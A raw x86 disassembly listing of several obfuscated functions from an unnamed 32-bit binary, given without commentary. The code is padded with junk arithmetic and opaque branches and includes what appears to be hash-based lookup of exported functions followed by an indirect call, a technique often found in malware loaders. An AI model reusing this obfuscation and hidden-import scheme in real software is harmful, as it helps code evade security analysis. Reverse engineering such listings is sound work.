  40329b:	movzx  ecx,WORD PTR [ebp-0x54]
  40329f:	mov    eax,ecx
  4032a1:	jmp    0x40371c
  4032a6:	mov    edx,DWORD PTR [ebp+0xc]
  4032a9:	or     edx,0xa525b523
  4032af:	add    edx,DWORD PTR [ebp+0x14]
  4032b2:	mov    BYTE PTR [ebp-0x5c],dl
  4032b5:	cmp    WORD PTR [ebp-0x58],0x42d4
  4032bb:	jge    0x4032c8
  4032bd:	movzx  ecx,WORD PTR [ebp-0x58]
  4032c1:	mov    eax,ecx
  4032c3:	jmp    0x40371c
  4032c8:	movzx  eax,WORD PTR [ebp-0x58]
  4032cc:	movzx  ecx,BYTE PTR [ebp-0x5c]
  4032d0:	and    eax,ecx
  4032d2:	push   eax
  4032d3:	movzx  ecx,WORD PTR [ebp-0x58]
  4032d7:	movzx  edx,BYTE PTR [ebp-0x5c]
  4032db:	add    ecx,edx
  4032dd:	sub    ecx,0x42f7
  4032e3:	push   ecx
  4032e4:	movzx  eax,WORD PTR [ebp-0x54]
  4032e8:	movzx  ecx,BYTE PTR [ebp-0x5c]
  4032ec:	add    eax,ecx
  4032ee:	sub    eax,0x23
  4032f1:	push   eax
  4032f2:	movzx  ecx,BYTE PTR [ebp-0x5c]
  4032f6:	movzx  eax,WORD PTR [ebp-0x58]
  4032fa:	and    ecx,eax
  4032fc:	push   ecx
  4032fd:	movzx  ecx,BYTE PTR [ebp-0x5c]
  403301:	movzx  edx,WORD PTR [ebp-0x58]
  403305:	imul   ecx,edx
  403308:	add    ecx,0xfff6dd04
  40330e:	push   ecx
  40330f:	push   0x0
  403311:	movzx  eax,WORD PTR [ebp-0x54]
  403315:	movzx  ecx,BYTE PTR [ebp-0x5c]
  403319:	add    eax,ecx
  40331b:	sub    eax,0x23
  40331e:	push   eax
  40331f:	call   DWORD PTR ds:0x42202c
  403325:	mov    WORD PTR [ebp-0x58],ax
  403329:	mov    ax,WORD PTR [ebp-0x58]
  40332d:	test   ax,ax
  403330:	je     0x403349
  403332:	movzx  ecx,BYTE PTR [ebp-0x5c]
  403336:	or     ecx,0x6ec40000
  40333c:	movzx  edx,BYTE PTR [ebp-0x5c]
  403340:	xor    ecx,edx
  403342:	push   ecx
  403343:	call   DWORD PTR ds:0x422010
  403349:	movzx  eax,WORD PTR [ebp-0x58]
  40334d:	sub    eax,0xc32300
  403352:	mov    WORD PTR [ebp-0x58],ax
  403356:	cmp    BYTE PTR [ebp-0x5c],0x23
  40335a:	jle    0x403367
  40335c:	movzx  edx,WORD PTR [ebp-0x54]
  403360:	mov    eax,edx
  403362:	jmp    0x40371c
  403367:	movzx  eax,BYTE PTR [ebp-0x5c]
  40336b:	sub    eax,0x2e82
  403370:	mov    WORD PTR [ebp-0x60],ax
  403374:	cmp    WORD PTR [ebp-0x60],0xd1a1
  40337a:	jle    0x403387
  40337c:	movzx  ecx,WORD PTR [ebp-0x54]
  403380:	mov    eax,ecx
  403382:	jmp    0x40371c
  403387:	mov    eax,DWORD PTR [ebp-0x4c]
  40338a:	shl    eax,0x7
  40338d:	mov    ecx,DWORD PTR [ebp-0x4c]
  403390:	shr    ecx,0x19
  403393:	or     eax,ecx
  403395:	mov    DWORD PTR [ebp-0x4c],eax
  403398:	movzx  eax,WORD PTR [ebp-0x54]
  40339c:	shr    eax,1
  40339e:	mov    WORD PTR [ebp-0x60],ax
  4033a2:	mov    cx,WORD PTR [ebp-0x60]
  4033a6:	test   cx,cx
  4033a9:	je     0x4033b6
  4033ab:	movzx  ecx,WORD PTR [ebp-0x54]
  4033af:	mov    eax,ecx
  4033b1:	jmp    0x40371c
  4033b6:	movzx  edx,BYTE PTR [ebp-0x5c]
  4033ba:	movzx  ecx,WORD PTR [ebp-0x58]
  4033be:	or     edx,ecx
  4033c0:	add    edx,0xffff22dd
  4033c6:	mov    eax,DWORD PTR [ebp-0x48]
  4033c9:	movzx  ecx,BYTE PTR [eax+edx*1]
  4033cd:	xor    ecx,0x2a
  4033d0:	mov    edx,DWORD PTR [ebp-0x4c]
  4033d3:	add    edx,ecx
  4033d5:	mov    DWORD PTR [ebp-0x4c],edx
  4033d8:	movzx  ecx,BYTE PTR [ebp-0x5c]
  4033dc:	mov    WORD PTR [ebp-0x54],cx
  4033e0:	cmp    BYTE PTR [ebp-0x5c],0x23
  4033e4:	je     0x4033f1
  4033e6:	movzx  edx,WORD PTR [ebp-0x54]
  4033ea:	mov    eax,edx
  4033ec:	jmp    0x40371c
  4033f1:	movzx  eax,BYTE PTR [ebp-0x5c]
  4033f5:	movzx  ecx,WORD PTR [ebp-0x60]
  4033f9:	xor    eax,ecx
  4033fb:	sub    eax,0x22
  4033fe:	mov    edx,DWORD PTR [ebp-0x48]
  403401:	add    edx,eax
  403403:	mov    DWORD PTR [ebp-0x48],edx
  403406:	movzx  eax,WORD PTR [ebp-0x54]
  40340a:	mov    ecx,0x3b
  40340f:	xor    edx,edx
  403411:	div    ecx
  403413:	mov    WORD PTR [ebp-0x54],ax
  403417:	cmp    BYTE PTR [ebp-0x5c],0x22
  40341b:	jne    0x403428
  40341d:	movzx  ecx,WORD PTR [ebp-0x54]
  403421:	mov    eax,ecx
  403423:	jmp    0x40371c
  403428:	jmp    0x40325e
  40342d:	mov    edx,DWORD PTR [ebp-0x44]
  403430:	shl    edx,0x8
  403433:	mov    WORD PTR [ebp-0x64],dx
  403437:	cmp    WORD PTR [ebp-0x64],0x8700
  40343d:	jge    0x403449
  40343f:	mov    edx,DWORD PTR [ebp-0x3c]
  403442:	mov    eax,edx
  403444:	jmp    0x40371c
  403449:	mov    eax,DWORD PTR [ebp-0x24]
  40344c:	cmp    DWORD PTR [ebp-0x4c],eax
  40344f:	jne    0x4036a1
  403455:	mov    eax,DWORD PTR [ebp+0x10]
  403458:	mov    BYTE PTR [ebp-0x68],al
  40345b:	movzx  ecx,BYTE PTR [ebp-0x68]
  40345f:	shl    ecx,0x10
  403462:	mov    BYTE PTR [ebp-0x68],cl
  403465:	cmp    BYTE PTR [ebp-0x68],0x0
  403469:	jle    0x403476
  40346b:	movzx  edx,BYTE PTR [ebp-0x68]
  40346f:	mov    eax,edx
  403471:	jmp    0x40371c
  403476:	movzx  eax,BYTE PTR [ebp-0x68]
  40347a:	mov    BYTE PTR [ebp-0x68],al
  40347d:	cmp    BYTE PTR [ebp-0x68],0x0
  403481:	jle    0x403489
  403483:	call   DWORD PTR ds:0x422028
  403489:	cmp    BYTE PTR [ebp-0x68],0x0
  40348d:	jle    0x40349a
  40348f:	movzx  edx,BYTE PTR [ebp-0x68]
  403493:	mov    eax,edx
  403495:	jmp    0x40371c
  40349a:	movzx  ecx,BYTE PTR [ebp-0x68]
  40349e:	mov    WORD PTR [ebp-0x6c],cx
  4034a2:	cmp    WORD PTR [ebp-0x6c],0x0
  4034a7:	jge    0x4034b4
  4034a9:	movzx  edx,WORD PTR [ebp-0x6c]
  4034ad:	mov    eax,edx
  4034af:	jmp    0x40371c
  4034b4:	mov    eax,DWORD PTR [ebp-0x34]
  4034b7:	mov    edx,DWORD PTR [eax+0x18]
  4034ba:	sub    edx,DWORD PTR [ebp-0x10]
  4034bd:	movzx  eax,BYTE PTR [ebp-0x68]
  4034c1:	movzx  ecx,WORD PTR [ebp-0x6c]
  4034c5:	xor    eax,ecx
  4034c7:	sub    edx,eax
  4034c9:	mov    DWORD PTR [ebp-0x10],edx
  4034cc:	movzx  ecx,BYTE PTR [ebp-0x68]
  4034d0:	shr    ecx,0x2
  4034d3:	mov    BYTE PTR [ebp-0x70],cl
  4034d6:	movzx  edx,WORD PTR [ebp-0x6c]
  4034da:	movzx  ecx,BYTE PTR [ebp-0x68]
  4034de:	and    edx,ecx
  4034e0:	sub    edx,0xfffffff7
  4034e3:	mov    eax,DWORD PTR [ebp-0x34]
  4034e6:	mov    ecx,DWORD PTR [eax+edx*4]
  4034e9:	movzx  eax,WORD PTR [ebp-0x6c]
  4034ed:	movzx  edx,BYTE PTR [ebp-0x68]
  4034f1:	sub    eax,edx
  4034f3:	sub    ecx,eax
  4034f5:	mov    DWORD PTR [ebp-0x74],ecx
  4034f8:	movzx  eax,BYTE PTR [ebp-0x68]
  4034fc:	imul   eax,DWORD PTR [ebp+0x10]
  403500:	mov    WORD PTR [ebp-0x78],ax
  403504:	cmp    WORD PTR [ebp-0x78],0x0
  403509:	jle    0x403516
  40350b:	movzx  ecx,BYTE PTR [ebp-0x68]
  40350f:	mov    eax,ecx
  403511:	jmp    0x40371c
  403516:	mov    edx,DWORD PTR [ebp-0x74]
  403519:	add    edx,DWORD PTR [ebp-0x20]
  40351c:	movzx  eax,WORD PTR [ebp-0x6c]
  403520:	movzx  ecx,BYTE PTR [ebp-0x68]
  403524:	add    eax,ecx
  403526:	add    edx,eax
  403528:	mov    DWORD PTR [ebp-0x74],edx
  40352b:	mov    edx,DWORD PTR [ebp+0xc]
  40352e:	and    edx,DWORD PTR [ebp+0x10]
  403531:	mov    BYTE PTR [ebp-0x68],dl
  403534:	movzx  ecx,WORD PTR [ebp-0x6c]
  403538:	movzx  eax,BYTE PTR [ebp-0x70]
  40353c:	sub    ecx,eax
  40353e:	mov    eax,DWORD PTR [ebp-0x10]
  403541:	sub    eax,ecx
  403543:	mov    ecx,DWORD PTR [ebp-0x74]
  403546:	movzx  eax,WORD PTR [ecx+eax*2]
  40354a:	mov    DWORD PTR [ebp-0x10],eax
  40354d:	mov    ecx,DWORD PTR [ebp+0xc]
  403550:	movzx  eax,BYTE PTR [ebp-0x70]
  403554:	xor    ecx,eax
  403556:	mov    BYTE PTR [ebp-0x68],cl
  403559:	cmp    WORD PTR [ebp-0x78],0xffff
  40355e:	jne    0x403569
  403560:	movzx  eax,WORD PTR [ebp-0x6c]
  403564:	jmp    0x40371c
  403569:	movzx  eax,WORD PTR [ebp-0x6c]
  40356d:	movzx  edx,BYTE PTR [ebp-0x68]
  403571:	and    eax,edx
  403573:	sub    eax,0xfffffff9
  403576:	mov    edx,DWORD PTR [ebp-0x34]
  403579:	mov    ecx,DWORD PTR [edx+eax*4]
  40357c:	mov    edx,DWORD PTR [ebp-0x20]
  40357f:	add    edx,ecx
  403581:	movzx  eax,BYTE PTR [ebp-0x70]
  403585:	movzx  ecx,WORD PTR [ebp-0x78]
  403589:	or     eax,ecx
  40358b:	add    edx,eax
  40358d:	mov    DWORD PTR [ebp-0x38],edx
  403590:	movzx  eax,WORD PTR [ebp-0x78]
  403594:	add    eax,0x6032
  403599:	mov    WORD PTR [ebp-0x6c],ax
  40359d:	cmp    BYTE PTR [ebp-0x68],0x0
  4035a1:	jge    0x4035ae
  4035a3:	movzx  edx,BYTE PTR [ebp-0x68]
  4035a7:	mov    eax,edx
  4035a9:	jmp    0x40371c
  4035ae:	movzx  edx,BYTE PTR [ebp-0x68]
  4035b2:	movzx  eax,WORD PTR [ebp-0x78]
  4035b6:	or     edx,eax
  4035b8:	mov    ecx,DWORD PTR [ebp-0x10]
  4035bb:	sub    ecx,edx
  4035bd:	mov    edx,DWORD PTR [ebp-0x38]
  4035c0:	mov    eax,DWORD PTR [edx+ecx*4]
  4035c3:	mov    ecx,DWORD PTR [ebp-0x20]
  4035c6:	add    ecx,eax
  4035c8:	mov    DWORD PTR [ebp-0x7c],ecx
  4035cb:	movzx  edx,BYTE PTR [ebp-0x70]
  4035cf:	mov    BYTE PTR [ebp-0x70],dl
  4035d2:	cmp    WORD PTR [ebp-0x78],0x0
  4035d7:	jge    0x4035e2
  4035d9:	movzx  eax,WORD PTR [ebp-0x78]
  4035dd:	jmp    0x40371c
  4035e2:	movzx  eax,BYTE PTR [ebp-0x68]
  4035e6:	movzx  ecx,BYTE PTR [ebp-0x70]
  4035ea:	or     eax,ecx
  4035ec:	add    eax,0xe84f0a67
  4035f1:	mov    edx,0xe80c9a6b
  4035f6:	xor    edx,eax
  4035f8:	mov    DWORD PTR [ebp-0x8],edx
  4035fb:	movzx  edx,WORD PTR [ebp-0x78]
  4035ff:	sub    edx,0x1
  403602:	mov    WORD PTR [ebp-0x78],dx
  403606:	cmp    BYTE PTR [ebp-0x70],0x0
  40360a:	jge    0x403615
  40360c:	movzx  eax,WORD PTR [ebp-0x6c]
  403610:	jmp    0x40371c
  403615:	movzx  eax,WORD PTR [ebp-0x78]
  403619:	movzx  ecx,WORD PTR [ebp-0x6c]
  40361d:	xor    eax,ecx
  40361f:	sub    eax,0x9f8d
  403624:	push   eax
  403625:	movzx  eax,WORD PTR [ebp-0x6c]
  403629:	movzx  edx,BYTE PTR [ebp-0x68]
  40362d:	or     eax,edx
  40362f:	add    eax,0xffffafce
  403634:	push   eax
  403635:	movzx  ecx,WORD PTR [ebp-0x6c]
  403639:	movzx  eax,BYTE PTR [ebp-0x68]
  40363d:	imul   ecx,eax
  403640:	sub    ecx,0xfffe09b8
  403646:	push   ecx
  403647:	movzx  eax,BYTE PTR [ebp-0x70]
  40364b:	movzx  edx,WORD PTR [ebp-0x6c]
  40364f:	or     eax,edx
  403651:	sub    eax,0x6032
  403656:	push   eax
  403657:	call   DWORD PTR [ebp-0x7c]
  40365a:	mov    DWORD PTR [ebp-0x80],eax
  40365d:	movzx  edx,WORD PTR [ebp-0x78]
  403661:	sub    edx,0x1
  403664:	mov    WORD PTR [ebp-0x78],dx
  403668:	cmp    BYTE PTR [ebp-0x68],0xff
  40366c:	jne    0x403677
  40366e:	movzx  eax,WORD PTR [ebp-0x6c]
  403672:	jmp    0x40371c
  403677:	movzx  edx,BYTE PTR [ebp-0x68]
  40367b:	movzx  ecx,WORD PTR [ebp-0x6c]
  40367f:	or     edx,ecx
  403681:	sub    edx,0x6032
  403687:	mov    ecx,DWORD PTR [ebp-0x80]
  40368a:	add    ecx,edx
  40368c:	mov    eax,DWORD PTR [ebp-0x8]
  40368f:	mov    DWORD PTR [eax],ecx
  403691:	movzx  eax,BYTE PTR [ebp-0x68]
  403695:	mov    ecx,0x2c
  40369a:	xor    edx,edx
  40369c:	div    ecx
  40369e:	mov    BYTE PTR [ebp-0x70],al
  4036a1:	movzx  edx,WORD PTR [ebp-0x40]
  4036a5:	imul   edx,DWORD PTR [ebp-0x44]
  4036a9:	add    edx,0xcb4a2baf
  4036af:	mov    ecx,DWORD PTR [ebp-0x38]
  4036b2:	add    ecx,edx
  4036b4:	mov    DWORD PTR [ebp-0x38],ecx
  4036b7:	mov    eax,DWORD PTR [ebp-0x44]
  4036ba:	sub    eax,0x1
  4036bd:	mov    DWORD PTR [ebp-0x44],eax
  4036c0:	cmp    WORD PTR [ebp-0x40],0x3543
  4036c6:	jge    0x4036dd
  4036c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4036cb:	xor    ecx,0x429f0000
  4036d1:	mov    eax,DWORD PTR [ebp-0x44]
  4036d4:	sub    eax,ecx
  4036d6:	push   eax
  4036d7:	call   DWORD PTR ds:0x422070
  4036dd:	movzx  edx,WORD PTR [ebp-0x64]
  4036e1:	movzx  ecx,WORD PTR [ebp-0x50]
  4036e5:	or     edx,ecx
  4036e7:	sub    edx,0xef86
  4036ed:	mov    eax,DWORD PTR [ebp-0x10]
  4036f0:	sub    eax,edx
  4036f2:	mov    DWORD PTR [ebp-0x10],eax
  4036f5:	mov    ecx,DWORD PTR [ebp+0x14]
  4036f8:	mov    WORD PTR [ebp-0x40],cx
  4036fc:	cmp    DWORD PTR [ebp-0x3c],0xe211aa1f
  403703:	jge    0x40370a
  403705:	mov    eax,DWORD PTR [ebp-0x44]
  403708:	jmp    0x40371c
  40370a:	jmp    0x403170
  40370f:	mov    edx,DWORD PTR [ebp+0xc]
  403712:	add    edx,DWORD PTR [ebp+0x8]
  403715:	movzx  ebx,dl
  403718:	movzx  eax,WORD PTR [ebp-0xc]
  40371c:	pop    ebx
  40371d:	pop    edi
  40371e:	pop    esi
  40371f:	mov    esp,ebp
  403721:	pop    ebp
  403722:	ret    0x10
  403725:	push   ebp
  403726:	mov    ebp,esp
  403728:	sub    esp,0xc
  40372b:	push   esi
  40372c:	push   edi
  40372d:	push   ebx
  40372e:	mov    edx,DWORD PTR [ebp+0x8]
  403731:	movzx  esi,dl
  403734:	mov    ecx,DWORD PTR [ebp+0x8]
  403737:	add    ecx,0x64000000
  40373d:	movzx  edi,cx
  403740:	mov    eax,edi
  403742:	xor    eax,0x8ae1
  403747:	mov    edx,edi
  403749:	add    edx,eax
  40374b:	mov    ebx,edx
  40374d:	cmp    edi,0x0
  403750:	jle    0x403759
  403752:	mov    eax,ebx
  403754:	jmp    0x4037f5
  403759:	mov    eax,edi
  40375b:	xor    edx,edx
  40375d:	div    ebx
  40375f:	movzx  edi,ax
  403762:	mov    edx,edi
  403764:	test   dx,dx
  403767:	je     0x403770
  403769:	mov    eax,ebx
  40376b:	jmp    0x4037f5
  403770:	mov    eax,esi
  403772:	test   al,al
  403774:	jne    0x40377d
  403776:	call   0x403b63
  40377b:	mov    ebx,eax
  40377d:	mov    eax,DWORD PTR [ebp+0x8]
  403780:	imul   eax,eax,0x4
  403783:	mov    ecx,DWORD PTR [ebp+0x8]
  403786:	sub    ecx,eax
  403788:	mov    BYTE PTR [ebp-0x4],cl
  40378b:	mov    eax,esi
  40378d:	and    eax,DWORD PTR [ebp+0x8]
  403790:	mov    ecx,ebx
  403792:	imul   ecx,eax
  403795:	movzx  edi,cx
  403798:	cmp    BYTE PTR [ebp-0x4],0x0
  40379c:	jge    0x4037a2
  40379e:	mov    eax,ebx
  4037a0:	jmp    0x4037f5
  4037a2:	mov    eax,esi
  4037a4:	mov    ecx,0x44
  4037a9:	xor    edx,edx
  4037ab:	div    ecx
  4037ad:	mov    ebx,edx
  4037af:	mov    cl,BYTE PTR [ebp-0x4]
  4037b2:	test   cl,cl
  4037b4:	jne    0x4037c2
  4037b6:	push   edi
  4037b7:	push   ebx
  4037b8:	push   edi
  4037b9:	push   ebx
  4037ba:	call   0x402cc8
  4037bf:	movzx  edi,ax
  4037c2:	mov    edx,esi
  4037c4:	mov    BYTE PTR [ebp-0x4],dl
  4037c7:	mov    edx,edi
  4037c9:	and    edx,edx
  4037cb:	mov    WORD PTR [ebp-0x8],dx
  4037cf:	cmp    WORD PTR [ebp-0x8],0xffff
  4037d4:	jne    0x4037dc
  4037d6:	movzx  eax,WORD PTR [ebp-0x8]
  4037da:	jmp    0x4037f5
  4037dc:	mov    eax,DWORD PTR [ebp+0x8]
  4037df:	imul   eax,ebx
  4037e2:	mov    DWORD PTR [ebp-0xc],eax
  4037e5:	cmp    DWORD PTR [ebp-0xc],0x0
  4037e9:	jge    0x4037ef
  4037eb:	mov    eax,ebx
  4037ed:	jmp    0x4037f5
  4037ef:	movzx  edx,BYTE PTR [ebp-0x4]
  4037f3:	mov    eax,edx
  4037f5:	pop    ebx
  4037f6:	pop    edi
  4037f7:	pop    esi
  4037f8:	mov    esp,ebp
  4037fa:	pop    ebp
  4037fb:	ret    0x4
  4037fe:	push   ebp
  4037ff:	mov    ebp,esp
  403801:	sub    esp,0x4
  403804:	push   esi
  403805:	push   edi
  403806:	push   ebx
  403807:	mov    esi,0xb9
  40380c:	mov    ecx,esi
  40380e:	shr    ecx,1
  403810:	mov    edi,ecx
  403812:	mov    eax,edi
  403814:	movzx  esi,al
  403817:	cmp    edi,0x5c
  40381a:	je     0x403823
  40381c:	mov    eax,esi
  40381e:	jmp    0x4038bd
  403823:	mov    eax,edi
  403825:	sub    eax,0x538f
  40382a:	mov    ebx,eax
  40382c:	mov    ebx,edi
  40382e:	cmp    esi,0x5c
  403831:	jne    0x40383b
  403833:	push   ebx
  403834:	call   0x4013d5
  403839:	mov    ebx,eax
  40383b:	mov    edx,esi
  40383d:	shl    edx,0x8
  403840:	mov    edi,edx
  403842:	cmp    edi,0x5c00
  403848:	jle    0x40384e
  40384a:	mov    eax,edi
  40384c:	jmp    0x4038bd
  40384e:	mov    ebx,edi
  403850:	cmp    esi,0x5c
  403853:	jle    0x40385b
  403855:	mov    ecx,esi
  403857:	mov    eax,ecx
  403859:	jmp    0x4038bd
  40385b:	mov    ebx,edi
  40385d:	cmp    ebx,0x5c00
  403863:	je     0x40386b
  403865:	mov    edx,esi
  403867:	mov    eax,edx
  403869:	jmp    0x4038bd
  40386b:	cmp    edi,0x5c00
  403871:	jne    0x40387c
  403873:	push   esi
  403874:	push   ebx
  403875:	call   0x4027eb
  40387a:	mov    edi,eax
  40387c:	mov    edx,ebx
  40387e:	sub    edx,edx
  403880:	movzx  esi,dl
  403883:	cmp    ebx,0x5c00
  403889:	jge    0x40388f
  40388b:	mov    eax,ebx
  40388d:	jmp    0x4038bd
  40388f:	mov    eax,edi
  403891:	or     eax,DWORD PTR [ebp+0x8]
  403894:	mov    WORD PTR [ebp-0x4],ax
  403898:	movzx  eax,WORD PTR [ebp-0x4]
  40389c:	xor    edx,edx
  40389e:	div    ebx
  4038a0:	mov    WORD PTR [ebp-0x4],ax
  4038a4:	cmp    WORD PTR [ebp-0x4],0x0
  4038a9:	jle    0x4038af
  4038ab:	mov    eax,esi
  4038ad:	jmp    0x4038bd
  4038af:	mov    eax,DWORD PTR [ebp+0x8]
  4038b2:	movzx  ecx,WORD PTR [ebp-0x4]
  4038b6:	imul   eax,ecx
  4038b9:	mov    edi,eax
  4038bb:	mov    eax,edi
  4038bd:	pop    ebx
  4038be:	pop    edi
  4038bf:	pop    esi
  4038c0:	mov    esp,ebp
  4038c2:	pop    ebp
  4038c3:	ret    0x4
  4038c6:	push   ebp
  4038c7:	mov    ebp,esp
  4038c9:	sub    esp,0x10
  4038cc:	push   esi
  4038cd:	push   edi
  4038ce:	push   ebx
  4038cf:	mov    esi,0x50000000
  4038d4:	mov    ecx,esi
  4038d6:	shl    ecx,0x10
  4038d9:	movzx  edi,cl
  4038dc:	cmp    esi,0x50000000
  4038e2:	jge    0x4038ed
  4038e4:	mov    ecx,edi
  4038e6:	mov    eax,ecx
  4038e8:	jmp    0x403a47
  4038ed:	mov    ebx,esi
  4038ef:	mov    eax,esi
  4038f1:	xor    edx,edx
  4038f3:	div    ebx
  4038f5:	mov    esi,edx
  4038f7:	mov    ecx,ebx
  4038f9:	and    ecx,0x3800
  4038ff:	mov    WORD PTR [ebp-0x4],cx
  403903:	cmp    WORD PTR [ebp-0x4],0xffff
  403908:	jne    0x403921
  40390a:	movzx  eax,WORD PTR [ebp-0x4]
  40390e:	push   eax
  40390f:	push   esi
  403910:	mov    eax,esi
  403912:	xor    eax,0x43
  403915:	mov    edx,esi
  403917:	imul   edx,eax
  40391a:	push   edx
  40391b:	call   DWORD PTR ds:0x422068
  403921:	mov    ecx,ebx
  403923:	shl    ecx,0x18
  403926:	mov    ebx,ecx
  403928:	mov    eax,edi
  40392a:	mov    ecx,0x4b
  40392f:	xor    edx,edx
  403931:	div    ecx
  403933:	mov    ebx,eax
  403935:	mov    ebx,ebx
  403937:	test   ebx,ebx
  403939:	je     0x403942
  40393b:	mov    eax,ebx
  40393d:	jmp    0x403a47
  403942:	mov    eax,edi
  403944:	add    eax,0x9f960000
  403949:	mov    WORD PTR [ebp-0x4],ax
  40394d:	cmp    WORD PTR [ebp-0x4],0x0
  403952:	jle    0x403995
  403954:	mov    eax,esi
  403956:	or     eax,0xbf
  40395b:	movzx  edx,WORD PTR [ebp-0x4]
  40395f:	imul   edx,eax
  403962:	push   edx
  403963:	movzx  ecx,WORD PTR [ebp-0x4]
  403967:	imul   ecx,ecx,0xf36a
  40396d:	push   ecx
  40396e:	mov    edx,ebx
  403970:	imul   edx,edi
  403973:	push   edx
  403974:	mov    eax,edi
  403976:	or     eax,esi
  403978:	push   eax
  403979:	mov    ecx,ebx
  40397b:	or     ecx,0xb70f0000
  403981:	mov    eax,edi
  403983:	add    eax,ecx
  403985:	push   eax
  403986:	mov    eax,ebx
  403988:	imul   eax,eax,0xeb750000
  40398e:	push   eax
  40398f:	call   DWORD PTR ds:0x422024
  403995:	test   ebx,ebx
  403997:	jne    0x4039ae
  403999:	push   esi
  40399a:	push   esi
  40399b:	movzx  ecx,WORD PTR [ebp-0x4]
  40399f:	push   ecx
  4039a0:	movzx  eax,WORD PTR [ebp-0x4]
  4039a4:	push   eax
  4039a5:	call   0x402e71
  4039aa:	mov    WORD PTR [ebp-0x4],ax
  4039ae:	mov    edx,edi
  4039b0:	sub    edx,esi
  4039b2:	sub    edx,0x5e3bf792
  4039b8:	mov    esi,edx
  4039ba:	mov    ax,WORD PTR [ebp-0x4]
  4039be:	test   ax,ax
  4039c1:	je     0x4039c9
  4039c3:	movzx  eax,WORD PTR [ebp-0x4]
  4039c7:	jmp    0x403a47
  4039c9:	mov    ecx,edi
  4039cb:	add    ecx,ecx
  4039cd:	mov    DWORD PTR [ebp-0x8],ecx
  4039d0:	mov    DWORD PTR [ebp-0xc],ebx
  4039d3:	mov    eax,esi
  4039d5:	xor    eax,DWORD PTR [ebp-0x8]
  4039d8:	or     eax,0x35
  4039db:	mov    DWORD PTR [ebp-0xc],eax
  4039de:	cmp    esi,0xa1c4086e
  4039e4:	jne    0x4039f6
  4039e6:	push   DWORD PTR [ebp-0xc]
  4039e9:	push   DWORD PTR [ebp-0xc]
  4039ec:	push   esi
  4039ed:	push   esi
  4039ee:	call   0x4024bc
  4039f3:	movzx  edi,al
  4039f6:	mov    edx,DWORD PTR [ebp-0xc]
  4039f9:	add    edx,0xb3fc0000
  4039ff:	mov    DWORD PTR [ebp-0xc],edx
  403a02:	mov    cx,WORD PTR [ebp-0x4]
  403a06:	test   cx,cx
  403a09:	je     0x403a11
  403a0b:	mov    edx,edi
  403a0d:	mov    eax,edx
  403a0f:	jmp    0x403a47
  403a11:	movzx  ecx,WORD PTR [ebp-0x4]
  403a15:	xor    ecx,0x2ce99aa4
  403a1b:	sub    ecx,DWORD PTR [ebp-0x8]
  403a1e:	mov    DWORD PTR [ebp-0xc],ecx
  403a21:	cmp    esi,0xa1c4086e
  403a27:	jge    0x403a31
  403a29:	movzx  edx,WORD PTR [ebp-0x4]
  403a2d:	mov    eax,edx
  403a2f:	jmp    0x403a47
  403a31:	mov    edx,esi
  403a33:	shl    edx,0x8
  403a36:	mov    DWORD PTR [ebp-0x10],edx
  403a39:	mov    ecx,edi
  403a3b:	sub    ecx,0x1
  403a3e:	movzx  edi,cl
  403a41:	movzx  edx,WORD PTR [ebp-0x4]
  403a45:	mov    eax,edx
  403a47:	pop    ebx
  403a48:	pop    edi
  403a49:	pop    esi
  403a4a:	mov    esp,ebp
  403a4c:	pop    ebp
  403a4d:	ret    
  403a4e:	push   ebp
  403a4f:	mov    ebp,esp
  403a51:	sub    esp,0xc
  403a54:	push   esi
  403a55:	push   edi
  403a56:	push   ebx
  403a57:	mov    esi,0x42
  403a5c:	mov    edx,esi
  403a5e:	shl    edx,0x10
  403a61:	movzx  edi,dx
  403a64:	cmp    esi,0x42
  403a67:	je     0x403a72
  403a69:	mov    ecx,esi
  403a6b:	mov    eax,ecx
  403a6d:	jmp    0x403b5a
  403a72:	mov    edx,edi
  403a74:	sub    edx,esi
  403a76:	mov    ebx,edx
  403a78:	mov    ecx,DWORD PTR [ebp+0x8]
  403a7b:	movzx  esi,cx
  403a7e:	mov    eax,ebx
  403a80:	sub    eax,0x1
  403a83:	mov    ebx,eax
  403a85:	mov    edx,ebx
  403a87:	shl    edx,0x8
  403a8a:	mov    WORD PTR [ebp-0x4],dx
  403a8e:	mov    eax,esi
  403a90:	test   ax,ax
  403a93:	je     0x403a9c
  403a95:	mov    eax,ebx
  403a97:	jmp    0x403b5a
  403a9c:	mov    edx,ebx
  403a9e:	movzx  edi,dx
  403aa1:	mov    eax,edi
  403aa3:	shl    eax,0x10
  403aa6:	mov    DWORD PTR [ebp-0x8],eax
  403aa9:	mov    ebx,DWORD PTR [ebp-0x8]
  403aac:	mov    ecx,DWORD PTR [ebp+0x10]
  403aaf:	and    ecx,edi
  403ab1:	mov    BYTE PTR [ebp-0xc],cl
  403ab4:	cmp    DWORD PTR [ebp-0x8],0xffbcffff
  403abb:	jne    0x403ac4
  403abd:	mov    eax,ebx
  403abf:	jmp    0x403b5a
  403ac4:	mov    edx,ebx
  403ac6:	imul   edx,DWORD PTR [ebp+0xc]
  403aca:	movzx  ecx,BYTE PTR [ebp-0xc]
  403ace:	imul   edx,ecx
  403ad1:	movzx  esi,dx
  403ad4:	cmp    WORD PTR [ebp-0x4],0xbcff
  403ada:	jne    0x403ae0
  403adc:	mov    eax,ebx
  403ade:	jmp    0x403b5a
  403ae0:	cmp    edi,0xffbd
  403ae6:	jne    0x403af9
  403ae8:	movzx  eax,WORD PTR [ebp-0x4]
  403aec:	push   eax
  403aed:	push   DWORD PTR [ebp-0x8]
  403af0:	push   edi
  403af1:	call   0x40178f
  403af6:	mov    DWORD PTR [ebp-0x8],eax
  403af9:	mov    eax,esi
  403afb:	xor    edx,edx
  403afd:	div    ebx
  403aff:	mov    BYTE PTR [ebp-0xc],dl
  403b02:	cmp    ebx,0xffbd0000
  403b08:	jge    0x403b10
  403b0a:	mov    edx,edi
  403b0c:	mov    eax,edx
  403b0e:	jmp    0x403b5a
  403b10:	mov    eax,edi
  403b12:	sub    eax,0x794e06df
  403b17:	movzx  esi,ax
  403b1a:	cmp    WORD PTR [ebp-0x4],0xbd00
  403b20:	jge    0x403b45
  403b22:	mov    ecx,DWORD PTR [ebp-0x8]
  403b25:	add    ecx,0xdedb
  403b2b:	push   ecx
  403b2c:	movzx  edx,BYTE PTR [ebp-0xc]
  403b30:	push   edx
  403b31:	mov    ecx,DWORD PTR [ebp-0x8]
  403b34:	and    ecx,0x595b94f0
  403b3a:	mov    eax,ebx
  403b3c:	add    eax,ecx
  403b3e:	push   eax
  403b3f:	call   DWORD PTR ds:0x42204c
  403b45:	mov    eax,edi
  403b47:	xor    edx,edx
  403b49:	div    ebx
  403b4b:	mov    ebx,eax
